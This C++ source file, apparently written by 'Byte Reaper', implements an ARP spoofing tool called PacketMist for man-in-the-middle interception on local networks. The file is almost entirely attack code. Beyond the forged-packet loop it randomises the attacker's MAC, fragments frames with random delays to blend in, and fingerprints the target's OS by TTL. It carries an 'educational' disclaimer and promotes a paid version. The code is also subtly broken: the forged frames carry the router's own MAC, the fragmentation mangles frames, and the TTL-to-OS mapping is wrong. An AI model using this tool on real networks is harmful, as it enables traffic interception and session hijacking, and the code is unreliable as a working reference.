// Filename: PacketMist.cpp
// Author: Byte Reaper
// Description: A simple ARP Spoofing tool implemented in C++ (using pcap library)
// Category: Network Security 
//
// Overview:
// This is a simple ARP Spoofing tool written in C++ using the pcap library. ARP Spoofing
// (also known as ARP poisoning) is a technique used to intercept, manipulate, or 
// redirect network traffic in a local network by sending fake ARP messages. It allows
// an attacker to associate their own MAC address with another device's IP address.
//
// Key Features:
// - This tool can be used for network sniffing, MITM (Man-in-the-Middle) attacks, and
//   other security testing scenarios within local networks.
// - It enables an attacker to perform various attacks like session hijacking, traffic
//   interception, and modification of network packets.
//
// Intended Use:
// This tool is intended for educational purposes only. It demonstrates how ARP Spoofing 
// works and can be used in network security research or penetration testing scenarios.
// Unauthorized use or deployment of this tool is illegal and unethical. Always ensure 
// you have proper authorization before conducting any penetration testing activities.
//
// Legal Disclaimer:
// This code is meant for use in controlled, ethical hacking environments, such as 
// penetration testing with explicit permission from the network owner. Unauthorized 
// use of ARP Spoofing is prohibited and could result in legal action.
//
// Compilation:
// To compile the code, use the following command:
// g++ PacketMist.cpp -o PacketMist -lpcap
//
// Usage:
// 1. Select a network interface using the program.
// 2. Provide the target IP, router IP, and respective MAC addresses.
// 3. The program will continuously send ARP packets to poison the target, performing
//    ARP Spoofing until the program is stopped manually.
// ---------------------------------------------------------------------------------

//Of course, this is only the free version. Soon, 
//I'll be releasing the paid version, which is very special. This version is intended for testing on small networks only. Stay tuned for the paid version, which is more powerful.



// Including necessary header files for network packet capturing, socket programming, and utility functions
#include <iostream>
#include <pcap.h> // for packet capture library (PCAP)
#include <cstring> // for C-string manipulation functions
#include <netinet/if_ether.h> // for Ethernet header definitions
#include <netinet/in.h> // for internet address manipulation
#include <unistd.h> // for POSIX functions like sleep
#include <netinet/ip.h> // for IP header structure
#include <csignal> // for signal handling
#include <iomanip> // for input/output manipulators (like setting precision)
#include <chrono> // for time-related utilities like sleep_for
#include <thread> // for multi-threading utilities
#include <vector> // for using vectors (dynamic arrays)
#include <mutex> // for mutex to handle multi-thread synchronization
#include <algorithm> // for algorithmic operations
#include <ifaddrs.h> // for network interface address information
#include <sys/ioctl.h> // for input/output control operations
#include <net/if.h> // for interface control (like setting network interface settings)
#include <arpa/inet.h> // for utilities related to IP addresses
#include <sys/socket.h> // for socket operations (network communication)
#include <netinet/ip_icmp.h> // for ICMP protocol (ping)
#include <sys/time.h> // for time operations
#include <errno.h> // for error handling
#include <fstream> // for file input/output
#include <random> // for random number generation

// Including the necessary standard libraries for synchronization and string manipulation
using namespace std;

// Mutex to handle thread synchronization. It ensures mutual exclusion when accessing shared resources.
mutex mutexS;

// ARP (Address Resolution Protocol) structure to represent an ARP packet
// This structure contains the necessary fields to capture an ARP packet's details.
struct arp {
    uint16_t hw_type;        // Hardware type (e.g., Ethernet is 1)
    uint16_t protocol_type;  // Protocol type (e.g., IPv4 is 0x0800)
    uint8_t mac_size;        // MAC address size (usually 6 bytes)
    uint8_t ip_size;         // IP address size (usually 4 bytes)
    uint16_t op_code;        // Operation code (1 for ARP request, 2 for ARP reply)
    uint8_t source_mac[6];   // Source MAC address (6 bytes)
    uint8_t source_ip[4];    // Source IP address (4 bytes)
    uint8_t target_mac[6];   // Target MAC address (6 bytes)
    uint8_t target_ip[4];    // Target IP address (4 bytes)
};

// Function to print a message slowly, one character at a time, with a delay between each character
// This function can be used for aesthetic purposes to simulate a "typing" effect in the terminal

void slow(const string &mes)
{
    
    // Loop through each character of the message
    for (char c : mes)
    {
        // Print the current character and immediately flush the output buffer
        cout << c << flush;
        //Introduce a 150ms delay between characters for the "slow printing" effect
        this_thread::sleep_for(chrono::milliseconds(150));
    }
    // Print a newline after the entire message is displayed
    cout << endl;

}

// Function to log a message to a file named "arp.log" with a timestamp.
void logFile(const string& message)
{
    // Open the log file in append mode. If the file doesn't exist, it will be created.
    ofstream logFile("arp.log", ios::app);

    // Check if the file is open and ready for writing
    if (logFile.is_open())
    {
        // Get the current time and convert it to a time_t forma
        auto now = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
        // Convert time_t to a human-readable string
        string timeStr = ctime(&now);

        // Remove the trailing newline character added by ctime
        timeStr.pop_back(); 
        // Write the timestamp and the message to the log file
        logFile << "[" << timeStr << "] " << message << endl;

        // Close the log file after writing the message
        logFile.close();
    }
    else
    {
        // If the file could not be opened, print an error message in red
        cout << "\033\e[0;31m[-] Error: Unable to open log file!" << endl;
    }
}

// Function to create an ARP request packet
void create_packet(uint8_t* packet,   // Pointer to the buffer where the packet will be constructed
    uint8_t* src_ip,          // Source IP address
    uint8_t* src_mac,    // Source MAC address
    uint8_t* dest_ip,    // Destination IP address
    uint8_t* dest_mac) {     // Destination MAC address

    // Define Ethernet header at the start of the packet
    struct ethhdr* ethernet = (struct ethhdr*)packet;
    // Define ARP header right after the Ethernet header
    struct arp* arp_header = (struct arp*)(packet + sizeof(struct ethhdr));

     // Set Ethernet header fields
    memcpy(ethernet->h_source,
        src_mac,                     // Set source MAC address
        6);                     
    memcpy(ethernet->h_dest,
        dest_mac,                   // Set destination MAC address
        6);
    ethernet->h_proto = htons(ETH_P_ARP);      // Set Ethernet type to ARP

    // Set ARP header fields
    arp_header->hw_type = htons(1);          // Hardware type (Ethernet)
    arp_header->protocol_type = htons(ETH_P_IP);       // Protocol type (IP)
    arp_header->mac_size = 6;                         // MAC address size
    arp_header->ip_size = 4;                         // IP address size
    arp_header->op_code = htons(1);                  // Operation code (ARP Request)

    // Set ARP source fields
    memcpy(arp_header->source_mac,
        src_mac,
        6);            // Sender MAC address

    memcpy(arp_header->source_ip,
        src_ip,           // Sender IP address
        4);
    memcpy(arp_header->target_mac,
        dest_mac,
        6);                    // Target MAC address (usually empty in ARP Request)

    memcpy(arp_header->target_ip,
        dest_ip,              // Target IP address
        4);
}

// Function to send an ARP packet using pcap
void send_arp(pcap_t* handle, // PCAP handle to send the packet
    uint8_t* packet,            // Pointer to the packet buffer
    int packet_size) {      // Size of the packet in bytes
    if (pcap_sendpacket(handle, packet, packet_size) != 0) {
        cerr << "\e[0;31m[-] Error sending packet" << endl;         // Error message to console
         // Log the error
        logFile("\e[0;31m[-] An error occurred while sending the packet. Please check your connection and the target connection. Try the arp-scan -l command and get the real and correct target.");
    }
}

// Structure to represent CPU usage statistics
struct Cpu
{
    long long user;     // Time spent in user mode
    long long nice;     // Time spent in user mode with low priority (nice)
    long long system;   // Time spent in system mode (kernel)
    long long idle;     // Time spent idle
    long long iowait;   // Time waiting for I/O to complete
    long long irq;      // Time servicing interrupts
    long long softirq;  // Time servicing soft interrupts
    long long steal;    // Time stolen by other operating systems running in a virtual environment

    // Function to calculate total CPU time
    long long total() const {
        return user + nice + system + idle + iowait + irq + softirq + steal;
    }
};

// Function to read CPU statistics from /proc/stat
Cpu getCpu()
{
    ifstream file("/proc/stat"); // Open the /proc/stat file
    string cpu_label;            // Label for the CPU line
    Cpu times;                   // Structure to hold CPU times
    
    // Read the CPU times from the file
    file >> cpu_label >> times.user >> times.nice >> times.system >> times.idle
         >> times.iowait >> times.irq >> times.softirq >> times.steal;
    
    return times; // Return the filled Cpu structure
}

// Function to monitor and display CPU usage periodically
void cpuUsage()
{
    while (true)
    {
        // Capture CPU stats at time1
        Cpu time1 = getCpu();
        this_thread::sleep_for(chrono::milliseconds(10000)); // Wait for 10 seconds
        // Capture CPU stats at time2
        Cpu time2 = getCpu();

        // Calculate differences in idle and total CPU times
        long long idle_diff = time2.idle - time1.idle;
        long long total_diff = time2.total() - time1.total();

        // Calculate CPU usage percentage
        double cpu_usage = 100.0 * (1.0 - (double)idle_diff / total_diff);

        // Display CPU usage information
        cout << "[+]-------Your processor status-----------" << endl;
        cout << "[+] CPU Usage: " << cpu_usage << "%" << endl;
        cout << "[+]---------------------------------------" << endl;

        // If CPU usage exceeds 80%, display a warning
        if (cpu_usage > 80.0)
        {
            this_thread::sleep_for(chrono::milliseconds(1000));
            cout << "\e[0;31m[!]--------------------------------" << endl;
            cout << "\e[0;31m[-] Warning: CPU is under heavy load, pay attention!" << endl;
            cout << "\e[0;31m[!]--------------------------------" << endl;
        }
        else 
        {
            this_thread::sleep_for(chrono::milliseconds(1000));
            cout << "\e[0;33m[+]---------------------------------------" << endl;
            cout << "\e[0;33m[+] CPU load is normal..." << endl;
            cout << "\e[0;33m[+]---------------------------------------" << endl;
        }
    }
}

// Function to fragment and send an ARP packet in smaller parts
void arp_fragment(pcap_t* handle,
    uint8_t* packet,
    int packet_size) 
{
    // Randomly determine the fragment size between 40 and 70 bytes
    int fragment_size = 40 + (rand() % 30);
    // Calculate total number of fragments needed
    int total_fragments = (packet_size + fragment_size - 1) / fragment_size;

    for (int i = 0; i < total_fragments; i++) 
    {
        int offset = i * fragment_size;
        int remaining = packet_size - offset;
        int size = (remaining > fragment_size) ? fragment_size : remaining;

        // Send each fragment individually
        if (pcap_sendpacket(handle, packet + offset, size) != 0) 
        {
            logFile("\e[0;31m[-] There was an error in splitting the packets. Try to make sure that you and the target are connected and on the same network. The attack will continue despite that.");
        }

        // Introduce random delay between sending fragments to mimic natural traffic
        this_thread::sleep_for(chrono::milliseconds(rand() % 100 + 50));
    }
}

// Function to verify and parse an IP address from a string into a 4-byte array
bool verify_ip(uint8_t ip[4], const string& input) 
{
    int parts[4];

    // Parse the input string into four integer parts
    if (sscanf(input.c_str(), "%d.%d.%d.%d",
        &parts[0],
        &parts[1],
        &parts[2],
        &parts[3]) == 4) 
    {
        // Validate each part is within the 0-255 range
        for (int i = 0; i < 4; i++) 
        {
            if (parts[i] < 0 || parts[i] > 255) 
            {
                return false;
            }
            ip[i] = static_cast<uint8_t>(parts[i]);
        }
        return true;
    }

    // Return false if the input format is invalid
    return false;
}

// Function to verify and parse a MAC address from a string into a 6-byte array
bool verify_mac(uint8_t mac[6], const string& input) 
{
    int parts[6];

    // Parse the input string into six hexadecimal parts
    if (sscanf(input.c_str(),
        "%x:%x:%x:%x:%x:%x",
        &parts[0],
        &parts[1],
        &parts[2],
        &parts[3],
        &parts[4],
        &parts[5]) == 6)
    {
        // Validate each part is within the 0-255 range
        for (int i = 0; i < 6; i++) 
        {
            if (parts[i] < 0 || parts[i] > 255) 
            {
                return false;
            }
            mac[i] = static_cast<uint8_t>(parts[i]);
        }
        return true;
    }

    // Return false if the input format is invalid
    return false;
}

// Function to validate and display the TTL (Time To Live) value from a captured packet
void val_ttl(pcap_t* handle) 
{
    struct pcap_pkthdr* header;
    const u_char* packet;
    
    // Capture the next packet
    int res = pcap_next_ex(handle, &header, &packet);
    if (res <= 0)
    {
        cerr << "\e[0;31m[-] Error capturing packet" << endl;
        logFile("\e[0;31m[-] Failed to receive package");
        return;
    }

    // Extract the IP header after the Ethernet header
    struct ip* ip_header = (struct ip*)(packet + sizeof(struct ethhdr));
    uint8_t ttl = ip_header->ip_ttl;

    // Display and log the detected TTL value
    cout << "\e[0;34m[+] TTL Detected: " << (int)ttl << endl;
    logFile("\e[0;34m[+] TTL Detected: " + to_string((int)ttl));

    // Identify the system type based on TTL value
    if (ttl == 64) 
        cout << "\e[0;32m[+] Linux System" << endl;
    else if (ttl == 128) 
        cout << "\e[0;32m[+] Windows System" << endl;
    else if (ttl == 255) 
        cout << "\e[0;32m[+] macOS System" << endl;
    else 
        cout << "\e[0;33m[!] Unknown System" << endl;
}


// Function to check if a target device is online by sending an ARP request and waiting for a reply
bool device_online(pcap_t* handle, uint8_t* target_ip) 
{
    uint8_t packet[42];
    uint8_t broadcast_mac[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
    uint8_t src_ip[4] = { 0 };
    uint8_t src_mac[6] = { 0 };

    // Create an ARP request packet targeting the specified IP address
    create_packet(packet, src_ip, src_mac, target_ip, broadcast_mac);

    // Send the crafted ARP packet
    send_arp(handle, packet, sizeof(packet));

    struct pcap_pkthdr* header;
    const u_char* response;
    
    // Capture the response
    int res = pcap_next_ex(handle, &header, &response);
    if (res <= 0) {
        return false;
    }

    // Parse the ARP response
    struct arp* arp_response = (struct arp*)(response + sizeof(struct ethhdr));
    
    // Verify if the response is from the target IP
    if (ntohl(*(uint32_t*)arp_response->source_ip) == *(uint32_t*)target_ip) {
        return true;
    }
    
    return false;
}

// Function to retrieve the first non-loopback IPv4 address of the machine
string get_ip() 
{
    struct ifaddrs* interface;
    struct ifaddrs* ifa;
    char ip[INET_ADDRSTRLEN] = { 0 };

    // Get the list of network interfaces
    if (getifaddrs(&interface) == -1) {
        cerr << "\e[0;31m[-] Error getting IP!" << endl;
        return "";
    }

    // Iterate over the interfaces
    for (ifa = interface; ifa != NULL; ifa = ifa->ifa_next) 
    {
        if (ifa->ifa_addr && ifa->ifa_addr->sa_family == AF_INET) 
        {
            void* addr = &((struct sockaddr_in*)ifa->ifa_addr)->sin_addr;
            inet_ntop(AF_INET, addr, ip, sizeof(ip));

            // Skip the loopback address (127.0.0.1)
            if (strcmp("127.0.0.1", ip) != 0) 
            {
                freeifaddrs(interface);
                return string(ip);
            }
        }
    }

    // Free the linked list
    freeifaddrs(interface);
    return "";
}

// Function to get the MAC address of a specified network interface
string get_mac(const string& interface) 
{
    // Create a socket to communicate with the network interface
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        cerr << "\e[0;31m[-] Error creating socket!" << endl;
        logFile("\e[0;31m[-] Failed to create socket as usual. Make sure you have a good internet connection.");
        return "";
    }

    struct ifreq ifr;
    // Set the network interface name for the ifreq structure
    strncpy(ifr.ifr_name, interface.c_str(), IFNAMSIZ - 1);

    // Get the hardware (MAC) address for the interface
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        cerr << "\e[0;31m[-] Error getting MAC!" << endl;
        logFile("\e[0;31m[-] Failed to receive MAC address. Please provide a valid and real MAC.");
        close(sock);
        return "";
    }
    close(sock);

    // Convert the MAC address to a human-readable string (XX:XX:XX:XX:XX:XX)
    unsigned char* mac = (unsigned char*)ifr.ifr_hwaddr.sa_data;
    stringstream mac_ss;
    mac_ss << hex << setfill('0');
    for (int i = 0; i < 6; i++) {
        mac_ss << setw(2) << (int)mac[i];
        if (i < 5)
            mac_ss << ":";  // Add colon separator
    }

    return mac_ss.str();  // Return the formatted MAC address
}

// Function to restore ARP tables by sending ARP replies to target and router
void restore_arp(pcap_t* handle,
    uint8_t* target_ip,
    uint8_t* target_mac,
    uint8_t* router_ip,
    uint8_t* router_mac) 
{
    uint8_t restore_Router[42], restore_Target[42];

    // Create and send ARP reply to restore the target's ARP entry
    create_packet(restore_Target, 
        router_ip, 
        router_mac, 
        target_ip, 
        target_mac);
    *(uint16_t*)(restore_Target + 20) = htons(2); // ARP reply operation code
    send_arp(handle, restore_Target, sizeof(restore_Target));

    // Create and send ARP reply to restore the router's ARP entry
    create_packet(restore_Router, 
        target_ip, 
        target_mac, 
        router_ip, 
        router_mac);
    *(uint16_t*)(restore_Router + 20) = htons(2); // ARP reply operation code
    send_arp(handle, restore_Router, sizeof(restore_Router));

    // Notify that ARP tables have been restored
    cout << "\e[0;32m[+] ARP Tables Restored!" << endl;
}

pcap_t* global_handle = nullptr;
uint8_t global_router_ip[4] = { 0 }, global_target_ip[4] = { 0 };
uint8_t global_router_mac[6] = { 0 }, global_target_mac[6] = { 0 };

// Signal handler function to manage SIGINT (Ctrl+C) and restore ARP tables
void signal_handler(int signum) 
{
    // Display signal received message
    cout << "\e[0;33m\n[!] Received signal: " << signum << endl;

    // Check if the received signal is SIGINT (Ctrl+C)
    if (signum == SIGINT) {
        // Display stopping message and log it
        cout << "\e[0;33m[!] Stopping... Restoring ARP Tables!" << endl;
        logFile("[-] The ARP table has been restored as it was.");

        // Restore ARP tables for target and router
        restore_arp(global_handle, 
            global_target_ip, 
            global_target_mac, 
            global_router_ip, 
            global_router_mac);

        // Close the pcap handle to clean up resources
        pcap_close(global_handle);

        // Exit the program
        exit(0);
    }
}

// Function to change the MAC address of a given network interface
bool changeMac(const string& iface)
{
    // Initialize random number generator to create a new MAC address
    random_device rd;
    mt19937 gen(rd());
    uniform_int_distribution<> dis(0, 255);

    uint8_t newMac[6];

    // Generate a random MAC address
    for (int i = 0; i < 6; ++i) 
    {
        newMac[i] = dis(gen);
    }

    // Set the first byte of the MAC address to indicate a locally administered address
    newMac[0] = (newMac[0] & 0xFE) | 0x02;

    // Convert the generated MAC address into string format
    char macStr[18];
    snprintf(macStr, sizeof(macStr),
            "%02X:%02X:%02X:%02X:%02X:%02X",
            newMac[0],
            newMac[1],
            newMac[2],
            newMac[3],
            newMac[4],
            newMac[5]);

    // Prepare shell commands to disable the interface, change its MAC address, and bring it back up
    string down = "ip link set dev " + iface + " down";
    string change = "ip link set dev " + iface + " address " + macStr; 
    string up = "ip link set dev " + iface + " up";

    // Execute the commands, return false if any command fails
    if (system(down.c_str()) != 0 ||
        system(change.c_str()) != 0 ||
        system(up.c_str()) != 0) 
    {
        cerr << "\033[0;31m[-] Failed to change MAC address." << endl;
        logFile("[-] There is a problem changing your MAC address. Please make sure you are connected to the Internet");
        return false;
    }

    // Display the success message and log it
    cout << "\033[0;36m[+] MAC address changed to " << macStr << endl;
    logFile("[+] The MAC address has been changed successfully");

    return true;
}

 
int main() {
    if (getuid() != 0)
    {
        cerr << "\e[0;33m[!] This program must be run as root!" << endl;
        logFile("\e[0;31m[-] To run the tool, you need permissions. Please grant full permissions. Try the sudo su command and run the tool again.");
        return 1;
    }

    cout << "\e[0;32m";
    cout << R"(⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⣝⣿⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡾⣝⣾⠯⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣛⢾⠿⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡳⣼⠟⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣟⢶⣽⠛⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣷⣮⣿⠛⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⠈⣻⣿⣧⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰⠋⢠⡾⠉⠉⠉⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠁⣴⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠋⣠⡾⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡞⠁⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⠋⣠⣾⡋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠎⢀⣼⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡜⠃⣠⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⣠⣾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⢠⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰⠋⢀⣼⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠊⢀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⠋⣀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⣠⡾⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⡴⢋⣤⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⠞⢁⣴⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣀⡴⠊⣡⡾⠏⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠈⠛⠛⠛⠋@Byte Reaper ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
)" << endl;

    cout << "\e[0;35m------------------------------------------------------------------------------" << endl;

    slow("\e[0;33m[+] In the dark, the attack begins... and you won't see it until it's too late.");
    cout << "\e[0;35m------------------------------------------------------------------------------" << endl;
    cout << "\e[0;34m[+] This is the simple free version of the tools, paid version coming soon." << endl;

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_if_t* devices;
    if (pcap_findalldevs(&devices, errbuf) == PCAP_ERROR || devices == nullptr) {
        cerr << "\e[0;33m[!] No devices found: " << errbuf << endl;
        return 1;
    }

    cout << "\e[0;32m[+] Available network interface:" << endl;
    int dev_index = 1;
    for (pcap_if_t* dev = devices; dev; dev = dev->next, dev_index++) {
        cout << dev_index << ". " << dev->name << endl;
    }
    int choice;
    cout << "\e[0;32m[+] Select a device (1 - " << (dev_index - 1) << "): ";
    if (!(cin >> choice))
    {
        cerr << "\e[0;33m[-] No valid input provided!" << endl;
        logFile("\e[0;31m[-] Error: The number does not exist. Check the correct number.");
        return 1;
    }
    if (choice < 1 || choice > (dev_index -1))
    {
        cerr << "\e[0;33m[-] Invalid selection!" << endl;
        return 1;
    }

    pcap_if_t* selected_device = devices;
    
    for (int i = 1; i < choice && selected_device; i++) {
        selected_device = selected_device->next;
    }
    if (!selected_device) {
        cerr << "\e[0;33m[-] Invalid selection!" << endl;
        return 1;
    }
    string iface = selected_device->name;
    global_handle = pcap_open_live(selected_device->name,
        BUFSIZ,
        1,
        1000,
        errbuf);
    if (!global_handle) {
        cerr << "\e[0;31m[-] Error opening device" << endl;
        return 1;
    }

    uint8_t packet[42];
    uint8_t target_mac[6] = { 0 };
    uint8_t router_mac[6] = { 0 };
    uint8_t router_ip[4] = { 0 };
    uint8_t target_ip[4] = { 0 };
    string ip_input, mac_input;

    cout << "\e[0;35m[+] Enter router IP: ";
    cin >> ip_input;
    if (!verify_ip(router_ip, ip_input)) {
        cerr << "\e[0;33m[!] Invalid IP!" << endl;
        logFile("\e[0;31m[-] The IP is incorrect. Check the IP format you entered.");
        return 1;
    }

    cout << "\e[0;32m[+] Enter router MAC: ";
    cin >> mac_input;
    if (!verify_mac(router_mac, mac_input)) {
        cerr << "\e[0;31m[-] Invalid MAC!" << endl;
        return 1;
    }

    cout << "\e[0;33m[+] Enter target IP: ";
    cin >> ip_input;
    if (!verify_ip(target_ip, ip_input)) {
        cerr << "\e[0;33m[!] Invalid IP!" << endl;
        logFile("\e[0;31m[-] The IP is incorrect. Check the IP format you entered.");
        return 1;
    }

    cout << "\e[0;32m[+] Enter target MAC: ";
    cin >> mac_input;
    if (!verify_mac(target_mac, mac_input)) {
        cerr << "\e[0;33m[!] Invalid MAC!" << endl;
        return 1;
    }

    memcpy(global_router_ip,
        router_ip,
        4);
    memcpy(global_target_ip,
        target_ip,
        4);
    memcpy(global_router_mac,
        router_mac,
        6);
    memcpy(global_target_mac,
        target_mac,
        6);

    signal(SIGINT,
        signal_handler);

    
    val_ttl(global_handle);

    create_packet(packet,
        router_ip,
        router_mac,
        target_ip,
        target_mac);

    slow("\e[0;35m[+] Starting ARP Spoofing...");
    logFile("[+] The attack on the target has been launched...");
    if (!changeMac(iface))
    {
        cerr << "[-] MAC change failed, check interface name and root permissions." << endl;
        return 1;
    }

    std::thread cpu_thread(cpuUsage);
    while (true) {
        arp_fragment(global_handle, packet, sizeof(packet));
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
        cout << "\e[0;36m[+] Packet sent!" << endl;
        logFile("\e[0;36m[+] Packages sent successfully");
    }

    cpu_thread.join();       
    pcap_close(global_handle);

    return 0;
}
